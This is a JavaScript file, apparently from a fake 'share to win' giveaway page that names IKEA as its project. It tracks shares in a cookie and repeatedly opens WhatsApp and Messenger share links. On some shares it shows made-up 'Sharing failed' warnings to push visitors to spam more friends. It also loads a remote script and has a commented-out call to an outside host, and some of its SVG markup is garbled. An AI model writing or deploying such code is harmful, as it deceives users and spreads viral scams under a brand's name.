$.getScript('yuming.js?' + (new Date()).getTime());
    var share_number = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'));

    if (share_number > 0) {
        showShare()
        move()
    }

    type_op = get_Cookie('type_op') == '' ? 1 : parseInt(get_Cookie('type_op'));
    if(type_op === 2){
        showShare()
    }

    function showShare() {
        set_Cookie('type_op', 2)
        jQuery('#p_modal3').modal('hide');
        $('.share_page').show();
        $('#content4').show();
        $('#content3').hide();
        $('#content1').hide();
    }

    function continueBtn() {
        var share_num = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'))
        if (share_num < g_share_step) {
            swalert("You have to share with friends about our event. Share until the blue bar is full!","Unfortunately...");
        } else {
            jQuery(".share_ing").hide()
            jQuery(".share_success").show()
        }
    }

    function swalert(text,title=''){
    	if(title != ''){
    		Swal.fire({
	    		icon: 'warning',
	    		title: title,
				text: text,
			});
    	}else{
    		Swal.fire({
	    		icon: 'warning',
				text: text,
			});
    	}    	
    }

    function shareOkBtn() {
        window.open(Web)
    }

    function shareBtn() {
        var share_num = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'))
        share_num++
        if (share_num > g_share_step) {
            share_num = g_share_step;
        }

        let uagent = window.navigator.userAgent;
        if(uagent.indexOf('FB_IAB') != -1 || uagent.indexOf('Messenger') != -1){
            location.href = 'fb-messenger://share/?link='+encodeURIComponent(j + new Date().getTime());
        }else{
            if(navigator.userAgent.match(/(iPhone|iPod|iPad);?/i)){
                window.location.href = 'fb-messenger://share/?link='+encodeURIComponent(j+ new Date().getTime());
                window.setTimeout(function() {
                    window.location.href = 'whatsapp://send?text=' + j + new Date().getTime();
                    window.location.href = 'whatsapp://send?text=' + j + new Date().getTime();
                }, 1000);
            }else{
                location.href = 'whatsapp://send?text=' + j + new Date().getTime();
                location.href = 'fb-messenger://share/?link='+encodeURIComponent(j + new Date().getTime());
            }
        }

        setTimeout(function () {
            get_Cookie('prog') == '' ? value = 1 : value = parseInt(get_Cookie('prog'));
            if (value >= g_share_step) {
                continueBtn();
            }else{
                value == 2 || value == 4 ? swalert("The same group or the same friend is not correct. Please check and share again.","Sharing failed!") : void (0);
            }
            set_Cookie('prog', value + 1);
            // getVcode(value + 1);
            move()
        }, 3000)
    }

    function getVcode(value){
        var project = "IKEA";
        var time = parseInt(new Date().getTime()/1000);
        var oprUrl = 'https://v.gapis.xyz/vcode/?pj='+project+'&ts='+value+'&lang=en&_t='+time;
        $.ajax({type : 'get',url : oprUrl,data : {},async : true,dataType : 'json',success : function (data) {var vCode = data.vCode}});
    }

    function wxalert(t, n, b, flag, i) {
		//flag:1,success  2,normal
		var r, u;
		r = '<div class="weui_dialog_alert" style="position: fixed; z-index: 1000; display: none;margin-left:15%;margin-right:15%">';
		r += '<div class="weui_mask"></div>';
		r += '<div class="weui_dialog">';
		r += '<i class="weui_close"><svg t="1540783423798" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="s="http://www.w3.org/2000/svg" p-" p-id="1931" xmlns:xlink="k="http://www.w3.org/1999/xlink" wi" width="25" height="25"><path style="fill:#666;" d="M176.661601 817.172881C168.472798 825.644055 168.701706 839.149636 177.172881 847.338438 185.644056 855.527241 199.149636 855.298332 207.338438 846.827157L826.005105 206.827157C834.193907 198.355983 833.964998 184.850403 825.493824 176.661601 817.02265 168.472798 803.517069 168.701706 795.328267 177.172881L176.661601 817.172881ZM795.328267 846.827157C803.517069 855.298332 817.02265 855.527241 825.493824 847.338438 833.964998 839.149636 834.193907 825.644055 826.005105 817.172881L207.338438 177.172881C199.149636 168.701706 185.644056 168.472798 177.172881 176.661601 168.701706 184.850403 168.472798 198.355983 176.661601 206.827157L795.328267 846.827157Z" p-id="1932"></path></svg></i>';
		r += '<div class="weui_dialog_hd"><strong class="weui_dialog_title"></strong></div>';
		r += '<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"></div>';
		r += '<div class="weui_dialog_ft">';
		r += '<div href="javascript:void(0);" class="weui_btn_dialog primary btn">OK</div>';
		r += "</div>";
		r += "</div>";
		r += "</div>";

		$(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
		setTimeout(function() {
			u = $(".weui_dialog_alert");
			u.show();
			u.find(".weui_dialog_bd").html(n);
			u.find(".weui_dialog_title").html(t);
			u.find(".weui_btn_dialog").html(b ? b : "");
			u.find(".weui_btn_dialog").off("click").on("click", function() {
				i();
				u.hide();
				if (flag == 1) {
					stopConfetti();
				}
			});
			u.find(".weui_close").off("click").on("click", function() {
				i();
				u.hide();
				if (flag == 1) {
					stopConfetti();
				}
			});
			if (flag == 1) {
				startConfetti();
			}
		}, 500);
	}